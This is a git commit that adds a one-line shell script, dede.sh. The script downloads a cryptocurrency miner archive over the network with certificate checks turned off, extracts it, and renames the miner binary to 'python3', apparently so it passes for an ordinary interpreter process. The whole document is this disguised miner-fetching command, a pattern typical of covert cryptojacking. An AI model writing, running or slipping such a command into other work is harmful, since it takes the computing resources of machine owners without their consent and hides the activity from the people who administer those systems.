0bbb558df4f47761317b5c533f36f5f08369658a
adefff <108704960+adefff@users.noreply.github.com>
2022-10-15 20:54:43 +0700

    Create dede.sh

---
+++ dede.sh
@@ -0,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 python3 
